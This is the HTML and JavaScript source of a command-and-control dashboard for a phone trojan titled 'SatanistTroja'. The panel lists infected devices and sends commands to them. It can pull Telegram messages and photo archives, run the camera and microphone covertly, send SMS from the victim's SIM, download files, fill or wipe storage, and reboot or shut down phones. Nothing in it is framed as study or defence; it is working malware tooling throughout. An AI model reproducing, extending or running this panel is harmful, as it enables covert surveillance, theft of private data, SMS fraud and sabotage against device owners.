<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SatanistTroja</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', sans-serif; 
            background: #0d0a1a; 
            color: #e0d6f0; 
            padding: 20px; 
            min-height: 100vh;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
            padding-bottom: 16px;
            border-bottom: 1px solid #2a1f4a;
        }
        .header h1 { 
            font-size: 28px; 
            background: linear-gradient(135deg, #a78bfa, #7c3aed);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 700;
        }
        .header .badge {
            background: #2a1f4a;
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 13px;
            color: #a78bfa;
            border: 1px solid #4a3a6a;
        }
        .device {
            background: #14102a;
            border-radius: 16px;
            padding: 16px 20px;
            margin-bottom: 12px;
            border: 1px solid #2a1f4a;
            transition: all 0.3s;
            cursor: pointer;
        }
        .device:hover { border-color: #7c3aed; }
        .device.offline { opacity: 0.6; border-color: #3a2a4a; }
        .device.online { border-color: #7c3aed; }
        .device-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }
        .device-name {
            font-size: 18px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .device-name .expand-icon {
            font-size: 16px;
            transition: transform 0.3s;
            display: inline-block;
            color: #7c3aed;
        }
        .device-name .expand-icon.rotated { transform: rotate(180deg); }
        .status-tag {
            font-size: 13px;
            padding: 4px 12px;
            border-radius: 20px;
        }
        .status-tag.online { background: #1a3a2a; color: #6ee7a7; }
        .status-tag.offline { background: #3a1a1a; color: #f87171; }
        .device-details {
            display: flex;
            flex-wrap: wrap;
            gap: 16px;
            margin-top: 8px;
            font-size: 13px;
            color: #9a8aba;
        }
        .device-details span { display: flex; align-items: center; gap: 4px; }
        .last-seen { font-size: 12px; color: #6a5a7a; margin-top: 4px; }
        .menu-panel {
            background: #0d0a1a;
            border-radius: 12px;
            padding: 16px;
            margin-top: 12px;
            display: none;
            border: 1px solid #2a1f4a;
        }
        .menu-panel.active { display: block; }
        .menu-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
            gap: 8px;
            margin-top: 10px;
        }
        .btn {
            background: #2a1f4a;
            border: 1px solid #3a2a5a;
            color: #d0c6e8;
            padding: 8px 12px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 13px;
            transition: all 0.2s;
            text-align: center;
            width: 100%;
            font-family: inherit;
        }
        .btn:hover { 
            background: #3a2a5a;
            border-color: #7c3aed;
            transform: scale(1.02);
        }
        .btn:active { transform: scale(0.95); }
        .btn-primary { background: #7c3aed; border-color: #7c3aed; color: #fff; }
        .btn-primary:hover { background: #6d28d9; }
        .btn-danger { background: #4a1a2a; border-color: #6a2a3a; color: #f87171; }
        .btn-danger:hover { background: #6a2a3a; border-color: #f87171; }
        .btn-outline { background: transparent; border-color: #3a2a5a; }
        .btn-outline:hover { background: #2a1f4a; }
        .btn-recording { background: #6a1a1a; border-color: #8a2a2a; color: #f87171; animation: pulse 1s infinite; }
        @keyframes pulse { 0% { opacity: 0.7; } 50% { opacity: 1; } 100% { opacity: 0.7; } }
        .empty { text-align: center; padding: 60px 20px; color: #6a5a7a; }
        .empty .icon { font-size: 48px; margin-bottom: 16px; }
        .battery-bar {
            display: inline-block;
            width: 60px;
            height: 6px;
            background: #1a1a2a;
            border-radius: 3px;
            overflow: hidden;
            vertical-align: middle;
            margin-left: 4px;
        }
        .battery-bar .fill {
            height: 100%;
            border-radius: 3px;
            transition: width 0.5s;
        }
        .battery-bar .fill.high { background: #6ee7a7; }
        .battery-bar .fill.medium { background: #fbbf24; }
        .battery-bar .fill.low { background: #f87171; }
        .badge-model {
            background: #1a1a2a;
            padding: 2px 10px;
            border-radius: 12px;
            font-size: 12px;
            color: #9a8aba;
            font-weight: 400;
        }
        .menu-title {
            font-size: 14px;
            font-weight: 600;
            color: #a78bfa;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .modal-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85);
            backdrop-filter: blur(8px);
            z-index: 9998;
            justify-content: center;
            align-items: center;
        }
        .modal-overlay.active { display: flex; }
        .modal-content {
            background: #14102a;
            border: 1px solid #3a2a5a;
            border-radius: 20px;
            padding: 30px;
            max-width: 900px;
            width: 95%;
            max-height: 90vh;
            overflow-y: auto;
            position: relative;
            box-shadow: 0 20px 60px rgba(124, 58, 237, 0.3);
        }
        .modal-content .close-btn {
            position: sticky;
            top: 0;
            float: right;
            background: none;
            border: none;
            color: #6a5a7a;
            font-size: 28px;
            cursor: pointer;
            transition: 0.2s;
            z-index: 10;
        }
        .modal-content .close-btn:hover { color: #f87171; transform: rotate(90deg); }
        .modal-content .modal-title {
            font-size: 22px;
            font-weight: 600;
            color: #a78bfa;
            margin-bottom: 20px;
            padding-bottom: 12px;
            border-bottom: 1px solid #2a1f4a;
        }
        .modal-content .modal-body {
            color: #d0c6e8;
            font-size: 14px;
            line-height: 1.6;
            max-height: 60vh;
            overflow-y: auto;
        }
        .modal-content .modal-body .file-link {
            display: block;
            background: #2a1f4a;
            padding: 12px 16px;
            border-radius: 10px;
            margin: 8px 0;
            color: #a78bfa;
            text-decoration: none;
            border: 1px solid #3a2a5a;
            transition: 0.2s;
        }
        .modal-content .modal-body .file-link:hover {
            background: #3a2a5a;
            border-color: #7c3aed;
        }
        .modal-content .modal-body pre {
            background: #0d0a1a;
            padding: 16px;
            border-radius: 10px;
            overflow-x: auto;
            font-size: 13px;
            color: #c9c0d8;
            border: 1px solid #2a1f4a;
            max-height: 400px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
            font-family: 'Consolas', monospace;
        }
        .modal-content .modal-body .status-msg {
            padding: 10px 16px;
            border-radius: 8px;
            margin: 10px 0;
            background: #1a1a2a;
            border-left: 3px solid #7c3aed;
        }
        .modal-content .modal-body .status-msg.error {
            border-left-color: #f87171;
            color: #f87171;
        }
        .modal-content .modal-body .status-msg.success {
            border-left-color: #6ee7a7;
            color: #6ee7a7;
        }
        .btn-close-modal {
            margin-top: 16px;
            background: #2a1f4a;
            border: 1px solid #3a2a5a;
            color: #d0c6e8;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            transition: 0.2s;
            width: auto;
        }
        .btn-close-modal:hover {
            background: #3a2a5a;
            border-color: #7c3aed;
        }
        .btn-download {
            background: #7c3aed;
            border: none;
            color: #fff;
            padding: 8px 16px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 13px;
            transition: 0.2s;
            text-decoration: none;
            display: inline-block;
        }
        .btn-download:hover { background: #6d28d9; transform: scale(1.02); }
        .recording-indicator { color: #f87171; animation: pulse 1s infinite; }
        .file-item {
            background: #1a1a2a;
            padding: 10px 14px;
            border-radius: 10px;
            margin: 6px 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border: 1px solid #2a1f4a;
        }
        .file-item .filename { color: #a78bfa; }
        .file-item .filetime { color: #6a5a7a; font-size: 12px; }
        .sms-form {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 12px;
        }
        .sms-form input, .sms-form select, .sms-form textarea {
            background: #0d0a1a;
            border: 1px solid #2a1f4a;
            border-radius: 8px;
            padding: 10px;
            color: #d0c6e8;
            font-size: 14px;
            font-family: inherit;
        }
        .sms-form input:focus, .sms-form select:focus, .sms-form textarea:focus {
            border-color: #7c3aed;
            outline: none;
        }
        .sms-form textarea { min-height: 80px; resize: vertical; }
        .sms-form .btn-send {
            background: #7c3aed;
            border: none;
            color: #fff;
            padding: 10px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            transition: 0.2s;
        }
        .sms-form .btn-send:hover { background: #6d28d9; }
        @media (max-width: 600px) {
            .device-top { flex-direction: column; align-items: flex-start; }
            .menu-grid { grid-template-columns: repeat(2, 1fr); }
            .modal-content { padding: 16px; }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>satanist troja</h1>
        <span class="badge" id="deviceCount">0 devices</span>
    </div>
    <div id="devices">loading...</div>
</div>

<div class="modal-overlay" id="modalOverlay">
    <div class="modal-content">
        <button class="close-btn" onclick="closeModal()">✕</button>
        <div class="modal-title" id="modalTitle">function</div>
        <div class="modal-body" id="modalBody"></div>
        <button class="btn-close-modal" onclick="closeModal()">close</button>
    </div>
</div>

<script>
    let activeDeviceId = null;
    let recordingStates = {};
    let currentDeviceId = null;

    function openModal(title, content) {
        document.getElementById('modalTitle').textContent = title;
        document.getElementById('modalBody').innerHTML = content;
        document.getElementById('modalOverlay').classList.add('active');
    }

    function closeModal() {
        document.getElementById('modalOverlay').classList.remove('active');
    }

    document.getElementById('modalOverlay').addEventListener('click', function(e) {
        if (e.target === this) closeModal();
    });

    function toggleMenu(deviceId) {
        const panel = document.getElementById('menu-' + deviceId);
        const icon = document.querySelector(`.device[data-id="${deviceId}"] .expand-icon`);
        if (activeDeviceId && activeDeviceId !== deviceId) {
            const oldPanel = document.getElementById('menu-' + activeDeviceId);
            if (oldPanel) oldPanel.classList.remove('active');
            const oldIcon = document.querySelector(`.device[data-id="${activeDeviceId}"] .expand-icon`);
            if (oldIcon) oldIcon.classList.remove('rotated');
        }
        if (panel) {
            panel.classList.toggle('active');
            if (icon) icon.classList.toggle('rotated');
            activeDeviceId = panel.classList.contains('active') ? deviceId : null;
        }
    }

    function sendCommand(deviceId, command, data) {
        const payload = { deviceId, command };
        if (data) payload.data = data;
        fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    }

    // ===== ФУНКЦИИ МОДАЛЬНЫХ ОКОН =====

    function showSMS(deviceId) {
        openModal('send sms', `
            <div class="sms-form">
                <select id="smsSim">
                    <option value="0">sim 1</option>
                    <option value="1">sim 2</option>
                </select>
                <input type="text" id="smsNumber" placeholder="phone number" />
                <textarea id="smsText" placeholder="message content"></textarea>
                <button class="btn-send" onclick="sendSMS('${deviceId}')">send sms</button>
                <div id="smsStatus" style="margin-top:8px;color:#6a5a7a;font-size:13px;"></div>
            </div>
        `);
    }

    function sendSMS(deviceId) {
        const number = document.getElementById('smsNumber').value;
        const text = document.getElementById('smsText').value;
        const sim = document.getElementById('smsSim').value;
        if (!number || !text) {
            document.getElementById('smsStatus').textContent = '⚠️ fill all fields';
            return;
        }
        sendCommand(deviceId, 'send_sms', JSON.stringify({ number, text, sim }));
        document.getElementById('smsStatus').textContent = '✅ sms sending...';
    }

    function showMessages(deviceId, count) {
        const title = count === 30 ? 'telegram (30)' : 'telegram (1000)';
        openModal(title, `
            <div class="status-msg">⏳ requesting ${count} messages...</div>
            <div style="margin-top:12px;color:#6a5a7a;font-size:13px;">
                ${count === 1000 ? 'will be delivered as file' : 'messages will appear here'}
            </div>
        `);
        sendCommand(deviceId, count === 30 ? 'tgsms30' : 'tgsms1000');
    }

    function showPictures(deviceId) {
        openModal('pictures zip', `
            <div class="status-msg">⏳ creating archive...</div>
            <div style="margin-top:12px;color:#6a5a7a;font-size:13px;">this may take a moment</div>
        `);
        sendCommand(deviceId, 'pictures');
    }

    function showFiles(deviceId) {
        openModal('files', `<div class="status-msg">loading files...</div>`);
        fetch('/api/files/' + deviceId)
            .then(res => res.json())
            .then(files => {
                if (!files || files.length === 0) {
                    document.getElementById('modalBody').innerHTML = `<div class="status-msg">no files</div>`;
                    return;
                }
                let html = `<div style="margin-bottom:12px;">total: ${files.length} files</div>`;
                files.forEach(f => {
                    html += `
                        <div class="file-item">
                            <span class="filename">📄 ${f.filename}</span>
                            <span class="filetime">${new Date(f.created_at).toLocaleString()}</span>
                            <a href="/api/download/${deviceId}/${f.filename}" class="btn-download" download>⬇ download</a>
                        </div>
                    `;
                });
                document.getElementById('modalBody').innerHTML = html;
            })
            .catch(() => {
                document.getElementById('modalBody').innerHTML = `<div class="status-msg error">error loading files</div>`;
            });
    }

    function showCamera(deviceId) {
        openModal('camera', `
            <div class="status-msg">⏳ requesting camera stream...</div>
            <div style="margin-top:12px;color:#6a5a7a;font-size:13px;">camera feed will appear here when available</div>
            <div style="margin-top:12px;">
                <button class="btn btn-primary" onclick="sendCommand('${deviceId}', 'camera_start')">start camera</button>
                <button class="btn btn-danger" onclick="sendCommand('${deviceId}', 'camera_stop')">stop camera</button>
            </div>
        `);
    }

    function showVolumeMenu(deviceId) {
        openModal('volume control', `
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:10px;">
                <button class="btn btn-primary" onclick="sendCommand('${deviceId}','lock_volume');closeModal();">lock volume</button>
                <button class="btn btn-outline" onclick="sendCommand('${deviceId}','unlock_volume');closeModal();">unlock volume</button>
                <button class="btn btn-outline" onclick="sendCommand('${deviceId}','sound_normal');closeModal();">normal mode</button>
                <button class="btn btn-outline" onclick="sendCommand('${deviceId}','sound_silent');closeModal();">silent mode</button>
                <button class="btn btn-outline" onclick="sendCommand('${deviceId}','sound_max');closeModal();">max volume</button>
                <button class="btn btn-outline" onclick="sendCommand('${deviceId}','sound_min');closeModal();">min volume</button>
            </div>
        `);
    }

    function showRecording(deviceId) {
        const isRecording = recordingStates[deviceId] || false;
        openModal('audio recording', `
            <div style="text-align:center;padding:20px 0;">
                <div style="font-size:48px;margin-bottom:12px;">${isRecording ? '🔴' : '🎙'}</div>
                <div style="font-size:16px;margin-bottom:16px;color:#a78bfa;">
                    ${isRecording ? 'recording in progress...' : 'ready to record'}
                </div>
                <button class="btn ${isRecording ? 'btn-recording' : 'btn-danger'}" 
                        onclick="toggleRecordingFromModal('${deviceId}')" id="recordBtn">
                    ${isRecording ? 'stop recording' : 'start recording'}
                </button>
                <div id="recordingStatus" style="margin-top:12px;color:#6a5a7a;font-size:13px;"></div>
            </div>
        `);
        // После закрытия обновляем состояние
        const origClose = closeModal;
        window.closeModal = function() {
            if (recordingStates[deviceId]) {
                sendCommand(deviceId, 'voice_stop');
                recordingStates[deviceId] = false;
            }
            origClose();
        };
    }

    function toggleRecordingFromModal(deviceId) {
        const isRecording = recordingStates[deviceId] || false;
        const btn = document.getElementById('recordBtn');
        const status = document.getElementById('recordingStatus');
        if (isRecording) {
            sendCommand(deviceId, 'voice_stop');
            recordingStates[deviceId] = false;
            btn.textContent = 'start recording';
            btn.className = 'btn btn-danger';
            status.textContent = '✅ recording stopped, file will be available in files';
            // Обновляем список файлов
            setTimeout(() => showFiles(deviceId), 2000);
        } else {
            sendCommand(deviceId, 'voice_start');
            recordingStates[deviceId] = true;
            btn.textContent = 'stop recording';
            btn.className = 'btn btn-recording';
            status.textContent = '🔴 recording...';
        }
    }

    function getBatteryClass(level) {
        if (level >= 70) return 'high';
        if (level >= 30) return 'medium';
        return 'low';
    }

    function fetchDevices() {
        fetch('/api/devices')
            .then(res => res.json())
            .then(data => {
                const container = document.getElementById('devices');
                const countEl = document.getElementById('deviceCount');
                if (!data || data.length === 0) {
                    container.innerHTML = `<div class="empty"><div class="icon">📭</div><p>no devices connected</p></div>`;
                    countEl.textContent = '0 devices';
                    return;
                }
                countEl.textContent = data.length + ' devices';
                container.innerHTML = data.map(d => {
                    const isOnline = d.status === 'online';
                    const battery = d.battery !== undefined ? d.battery : 0;
                    const isRecording = recordingStates[d.id] || false;
                    return `
                        <div class="device ${isOnline ? 'online' : 'offline'}" data-id="${d.id}" onclick="toggleMenu('${d.id}')">
                            <div class="device-top">
                                <div class="device-name">
                                    ${d.name || 'unknown'}
                                    <span class="expand-icon">▾</span>
                                    <span class="badge-model">${d.model || 'unknown'}</span>
                                </div>
                                <div>
                                    <span class="status-tag ${isOnline ? 'online' : 'offline'}">
                                        ${isOnline ? '● online' : '● offline'}
                                    </span>
                                </div>
                            </div>
                            <div class="device-details">
                                <span>
                                    battery ${battery}%
                                    <span class="battery-bar"><span class="fill ${getBatteryClass(battery)}" style="width:${battery}%"></span></span>
                                </span>
                                <span>id ${d.id ? d.id.substring(0, 8) + '...' : 'n/a'}</span>
                                ${d.ip ? `<span>ip ${d.ip}</span>` : ''}
                            </div>
                            <div class="last-seen">last seen: ${d.last_seen ? new Date(d.last_seen).toLocaleString() : 'never'}</div>
                            
                            <div class="menu-panel" id="menu-${d.id}">
                                <div class="menu-title">▸ control panel</div>
                                <div class="menu-grid">
                                    <button class="btn btn-primary" onclick="event.stopPropagation(); sendCommand('${d.id}','reboot');">reboot</button>
                                    <button class="btn btn-danger" onclick="event.stopPropagation(); sendCommand('${d.id}','shutdown');">shutdown</button>
                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}','collect');">data</button>
                                    <button class="btn btn-outline" onclick="event.stopPropagation(); showPictures('${d.id}')">pictures zip</button>
                                    <button class="btn btn-outline" onclick="event.stopPropagation(); showVolumeMenu('${d.id}')">volume</button>
                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}','wifi_toggle');">wifi</button>
                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}','airplane');">airplane</button>
                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}','wallpaper');">wallpaper</button>
                                    <button class="btn btn-outline" onclick="event.stopPropagation(); showSMS('${d.id}')">send sms</button>
                                    <button class="btn btn-outline" onclick="event.stopPropagation(); showMessages('${d.id}', 30)">tg (30)</button>
                                    <button class="btn btn-outline" onclick="event.stopPropagation(); showMessages('${d.id}', 1000)">tg (1000)</button>
                                    <button class="btn btn-outline" onclick="event.stopPropagation(); showFiles('${d.id}')">files</button>
                                    <button class="btn btn-outline" onclick="event.stopPropagation(); showRecording('${d.id}')">audio rec</button>
                                    <button class="btn btn-outline" onclick="event.stopPropagation(); showCamera('${d.id}')">camera</button>
                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}','fill_storage');">fill storage</button>
                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}','clean_storage');">clean storage</button>
                                </div>
                            </div>
                        </div>
                    `;
                }).join('');
            })
            .catch(() => {
                document.getElementById('devices').innerHTML = '<div class="empty"><div class="icon">⚠️</div><p>error loading devices</p></div>';
            });
    }

    setInterval(fetchDevices, 5000);
    fetchDevices();
</script>
</body>
</html>
